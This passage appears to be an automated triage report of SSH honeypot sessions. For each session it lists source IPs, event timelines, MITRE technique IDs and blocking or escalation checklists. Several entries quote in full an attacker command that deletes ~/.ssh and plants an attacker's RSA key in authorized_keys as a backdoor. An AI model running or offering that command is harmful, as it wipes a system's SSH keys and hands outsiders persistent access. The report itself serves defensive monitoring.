| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:37:24` | `cowrie.session.connect` |
| `2026-07-06 17:37:24` | `cowrie.client.version` |
| `2026-07-06 17:37:24` | `cowrie.client.kex` |
| `2026-07-06 17:37:25` | `cowrie.login.success` |
| `2026-07-06 17:37:26` | `cowrie.session.params` |
| `2026-07-06 17:37:26` | `cowrie.command.input` |
| `2026-07-06 17:37:26` | `cowrie.command.failed` |
| `2026-07-06 17:37:27` | `cowrie.log.closed` |
| `2026-07-06 17:37:28` | `cowrie.session.params` |
| `2026-07-06 17:37:28` | `cowrie.command.input` |
| `2026-07-06 17:37:28` | `cowrie.session.file_download` |
| `2026-07-06 17:37:28` | `cowrie.log.closed` |
| `2026-07-06 17:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.62[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.154.62[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2b36f4c4be

| Field | Detail |
|---|---|
| **Source IP** | `103.154.62[.]14` |
| **First Seen** | 2026-07-06 17:37 |
| **Last Seen** | 2026-07-06 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:37:28` | `cowrie.session.connect` |
| `2026-07-06 17:37:28` | `cowrie.client.version` |
| `2026-07-06 17:37:29` | `cowrie.client.kex` |
| `2026-07-06 17:37:30` | `cowrie.login.success` |
| `2026-07-06 17:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.62[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.154.62[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fcaf5ea9b9

| Field | Detail |
|---|---|
| **Source IP** | `103.154.62[.]14` |
| **First Seen** | 2026-07-06 17:37 |
| **Last Seen** | 2026-07-06 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:37:30` | `cowrie.session.connect` |
| `2026-07-06 17:37:30` | `cowrie.client.version` |
| `2026-07-06 17:37:30` | `cowrie.client.kex` |
| `2026-07-06 17:37:31` | `cowrie.login.success` |
| `2026-07-06 17:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.62[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.154.62[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e23fe9102ebc

| Field | Detail |
|---|---|
| **Source IP** | `180.184.84[.]77` |
| **First Seen** | 2026-07-06 17:38 |
| **Last Seen** | 2026-07-06 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:38:37` | `cowrie.session.connect` |
| `2026-07-06 17:38:37` | `cowrie.client.version` |
| `2026-07-06 17:38:38` | `cowrie.client.kex` |
| `2026-07-06 17:38:39` | `cowrie.login.success` |
| `2026-07-06 17:38:39` | `cowrie.session.params` |
| `2026-07-06 17:38:39` | `cowrie.command.input` |
| `2026-07-06 17:38:39` | `cowrie.command.failed` |
| `2026-07-06 17:38:40` | `cowrie.log.closed` |
| `2026-07-06 17:38:41` | `cowrie.session.params` |
| `2026-07-06 17:38:41` | `cowrie.command.input` |
| `2026-07-06 17:38:41` | `cowrie.session.file_download` |
| `2026-07-06 17:38:41` | `cowrie.log.closed` |
| `2026-07-06 17:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.84[.]77` to AbuseIPDB if not already reported
- [ ] Block `180.184.84[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d524374db2

| Field | Detail |
|---|---|
| **Source IP** | `180.184.84[.]77` |
| **First Seen** | 2026-07-06 17:38 |
| **Last Seen** | 2026-07-06 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:38:42` | `cowrie.session.connect` |
| `2026-07-06 17:38:42` | `cowrie.client.version` |
| `2026-07-06 17:38:42` | `cowrie.client.kex` |
| `2026-07-06 17:38:43` | `cowrie.login.success` |
| `2026-07-06 17:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.84[.]77` to AbuseIPDB if not already reported
- [ ] Block `180.184.84[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c08b3862480

| Field | Detail |
|---|---|
| **Source IP** | `180.184.84[.]77` |
| **First Seen** | 2026-07-06 17:38 |
| **Last Seen** | 2026-07-06 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:38:43` | `cowrie.session.connect` |
| `2026-07-06 17:38:43` | `cowrie.client.version` |
| `2026-07-06 17:38:44` | `cowrie.client.kex` |
| `2026-07-06 17:38:45` | `cowrie.login.success` |
| `2026-07-06 17:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.84[.]77` to AbuseIPDB if not already reported
- [ ] Block `180.184.84[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bf12e166031

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 17:42 |
| **Last Seen** | 2026-07-06 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:42:38` | `cowrie.session.connect` |
| `2026-07-06 17:42:38` | `cowrie.client.version` |
| `2026-07-06 17:42:38` | `cowrie.client.kex` |
| `2026-07-06 17:42:38` | `cowrie.login.success` |
| `2026-07-06 17:42:39` | `cowrie.session.params` |
| `2026-07-06 17:42:39` | `cowrie.command.input` |
| `2026-07-06 17:42:39` | `cowrie.log.closed` |
| `2026-07-06 17:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b830b0feb54

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 17:46 |
| **Last Seen** | 2026-07-06 17:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:46:24` | `cowrie.session.connect` |
| `2026-07-06 17:46:25` | `cowrie.client.version` |
| `2026-07-06 17:46:25` | `cowrie.client.kex` |
| `2026-07-06 17:46:31` | `cowrie.login.success` |
| `2026-07-06 17:46:34` | `cowrie.session.params` |
| `2026-07-06 17:46:34` | `cowrie.command.input` |
| `2026-07-06 17:46:36` | `cowrie.log.closed` |
| `2026-07-06 17:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2414faaea7

| Field | Detail |
|---|---|
| **Source IP** | `46.101.229[.]179` |
| **First Seen** | 2026-07-06 17:57 |
| **Last Seen** | 2026-07-06 17:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:57:21` | `cowrie.session.connect` |
| `2026-07-06 17:57:27` | `cowrie.login.success` |
| `2026-07-06 17:57:28` | `cowrie.session.params` |
| `2026-07-06 17:57:32` | `cowrie.log.closed` |
| `2026-07-06 17:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.229[.]179` to AbuseIPDB if not already reported
- [ ] Block `46.101.229[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2ca7228511

| Field | Detail |
|---|---|
| **Source IP** | `46.101.229[.]179` |
| **First Seen** | 2026-07-06 17:57 |
| **Last Seen** | 2026-07-06 17:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:57:37` | `cowrie.session.connect` |
| `2026-07-06 17:57:37` | `cowrie.login.success` |
| `2026-07-06 17:57:38` | `cowrie.session.params` |
| `2026-07-06 17:57:42` | `cowrie.log.closed` |
| `2026-07-06 17:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.229[.]179` to AbuseIPDB if not already reported
- [ ] Block `46.101.229[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98070364579b

| Field | Detail |
|---|---|
| **Source IP** | `46.101.229[.]179` |
| **First Seen** | 2026-07-06 17:57 |
| **Last Seen** | 2026-07-06 17:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:57:42` | `cowrie.session.connect` |
| `2026-07-06 17:57:42` | `cowrie.login.success` |
| `2026-07-06 17:57:43` | `cowrie.session.params` |
| `2026-07-06 17:57:47` | `cowrie.log.closed` |
| `2026-07-06 17:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.229[.]179` to AbuseIPDB if not already reported
- [ ] Block `46.101.229[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b99cc732843

| Field | Detail |
|---|---|
| **Source IP** | `46.101.229[.]179` |
| **First Seen** | 2026-07-06 17:57 |
| **Last Seen** | 2026-07-06 17:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:57:47` | `cowrie.session.connect` |
| `2026-07-06 17:57:47` | `cowrie.login.success` |
| `2026-07-06 17:57:48` | `cowrie.session.params` |
| `2026-07-06 17:57:52` | `cowrie.log.closed` |
| `2026-07-06 17:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.229[.]179` to AbuseIPDB if not already reported
- [ ] Block `46.101.229[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0244c81a4255

| Field | Detail |
|---|---|
| **Source IP** | `46.101.229[.]179` |
| **First Seen** | 2026-07-06 17:58 |
| **Last Seen** | 2026-07-06 17:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:58:26` | `cowrie.session.connect` |
| `2026-07-06 17:58:26` | `cowrie.login.success` |
| `2026-07-06 17:58:26` | `cowrie.session.params` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:26` | `cowrie.command.failed` |
| `2026-07-06 17:58:26` | `cowrie.command.input` |
| `2026-07-06 17:58:33` | `cowrie.log.closed` |
| `2026-07-06 17:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.229[.]179` to AbuseIPDB if not already reported
- [ ] Block `46.101.229[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5253578dcca

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 17:58 |
| **Last Seen** | 2026-07-06 17:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:58:28` | `cowrie.session.connect` |
| `2026-07-06 17:58:29` | `cowrie.client.version` |
| `2026-07-06 17:58:29` | `cowrie.client.kex` |
| `2026-07-06 17:58:36` | `cowrie.login.success` |
| `2026-07-06 17:58:40` | `cowrie.session.params` |
| `2026-07-06 17:58:40` | `cowrie.command.input` |
| `2026-07-06 17:58:41` | `cowrie.log.closed` |
| `2026-07-06 17:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd5112140c1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 18:10 |
| **Last Seen** | 2026-07-06 18:11 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:10:50` | `cowrie.session.connect` |
| `2026-07-06 18:10:51` | `cowrie.client.version` |
| `2026-07-06 18:10:51` | `cowrie.client.kex` |
| `2026-07-06 18:10:59` | `cowrie.login.success` |
| `2026-07-06 18:11:03` | `cowrie.session.params` |
| `2026-07-06 18:11:03` | `cowrie.command.input` |
| `2026-07-06 18:11:04` | `cowrie.log.closed` |
| `2026-07-06 18:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1c00ebe67e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 18:14 |
| **Last Seen** | 2026-07-06 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:14:16` | `cowrie.session.connect` |
| `2026-07-06 18:14:16` | `cowrie.client.version` |
| `2026-07-06 18:14:16` | `cowrie.client.kex` |
| `2026-07-06 18:14:16` | `cowrie.login.success` |
| `2026-07-06 18:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b135cf0b32

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 18:14 |
| **Last Seen** | 2026-07-06 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:14:17` | `cowrie.session.connect` |
| `2026-07-06 18:14:17` | `cowrie.client.version` |
| `2026-07-06 18:14:17` | `cowrie.client.kex` |
| `2026-07-06 18:14:17` | `cowrie.login.success` |
| `2026-07-06 18:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa67fd8cfe74

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 18:14 |
| **Last Seen** | 2026-07-06 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:14:19` | `cowrie.session.connect` |
| `2026-07-06 18:14:19` | `cowrie.client.version` |
| `2026-07-06 18:14:19` | `cowrie.client.kex` |
| `2026-07-06 18:14:19` | `cowrie.login.success` |
| `2026-07-06 18:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8429cb33ed5d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 18:14 |
| **Last Seen** | 2026-07-06 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:14:19` | `cowrie.session.connect` |
| `2026-07-06 18:14:19` | `cowrie.client.version` |
| `2026-07-06 18:14:19` | `cowrie.client.kex` |
| `2026-07-06 18:14:19` | `cowrie.login.success` |
| `2026-07-06 18:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211710de1554

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 18:23 |
| **Last Seen** | 2026-07-06 18:23 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:23:05` | `cowrie.session.connect` |
| `2026-07-06 18:23:07` | `cowrie.client.version` |
| `2026-07-06 18:23:07` | `cowrie.client.kex` |
| `2026-07-06 18:23:14` | `cowrie.login.success` |
| `2026-07-06 18:23:18` | `cowrie.session.params` |
| `2026-07-06 18:23:18` | `cowrie.command.input` |
| `2026-07-06 18:23:19` | `cowrie.log.closed` |
| `2026-07-06 18:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5006da5e28b1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 18:35 |
| **Last Seen** | 2026-07-06 18:35 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:35:25` | `cowrie.session.connect` |
| `2026-07-06 18:35:26` | `cowrie.client.version` |
| `2026-07-06 18:35:26` | `cowrie.client.kex` |
| `2026-07-06 18:35:33` | `cowrie.login.success` |
| `2026-07-06 18:35:37` | `cowrie.session.params` |
| `2026-07-06 18:35:37` | `cowrie.command.input` |
| `2026-07-06 18:35:39` | `cowrie.log.closed` |
| `2026-07-06 18:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354e67b65275

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 18:37 |
| **Last Seen** | 2026-07-06 18:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:37:32` | `cowrie.session.connect` |
| `2026-07-06 18:37:32` | `cowrie.client.version` |
| `2026-07-06 18:37:32` | `cowrie.client.kex` |
| `2026-07-06 18:37:32` | `cowrie.login.success` |
| `2026-07-06 18:37:32` | `cowrie.direct-tcpip.request` |
| `2026-07-06 18:37:33` | `cowrie.direct-tcpip.data` |
| `2026-07-06 18:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc75871e4b21

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 18:37 |
| **Last Seen** | 2026-07-06 18:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:37:35` | `cowrie.session.connect` |
| `2026-07-06 18:37:35` | `cowrie.client.version` |
| `2026-07-06 18:37:35` | `cowrie.client.kex` |
| `2026-07-06 18:37:36` | `cowrie.login.success` |
| `2026-07-06 18:37:37` | `cowrie.session.params` |
| `2026-07-06 18:37:37` | `cowrie.command.input` |
| `2026-07-06 18:37:37` | `cowrie.log.closed` |
| `2026-07-06 18:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b71706f148f

| Field | Detail |
|---|---|
| **Source IP** | `186.147.162[.]215` |
| **First Seen** | 2026-07-06 18:39 |
| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:39:58` | `cowrie.session.connect` |
| `2026-07-06 18:39:58` | `cowrie.client.version` |
| `2026-07-06 18:39:58` | `cowrie.client.kex` |
| `2026-07-06 18:39:58` | `cowrie.login.success` |
| `2026-07-06 18:39:59` | `cowrie.session.params` |
| `2026-07-06 18:39:59` | `cowrie.command.input` |
| `2026-07-06 18:39:59` | `cowrie.command.failed` |
| `2026-07-06 18:39:59` | `cowrie.log.closed` |
| `2026-07-06 18:40:00` | `cowrie.session.params` |
| `2026-07-06 18:40:00` | `cowrie.command.input` |
| `2026-07-06 18:40:00` | `cowrie.session.file_download` |
| `2026-07-06 18:40:00` | `cowrie.log.closed` |
| `2026-07-06 18:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.147.162[.]215` to AbuseIPDB if not already reported
- [ ] Block `186.147.162[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfff115ae42

| Field | Detail |
|---|---|
| **Source IP** | `186.147.162[.]215` |
| **First Seen** | 2026-07-06 18:40 |
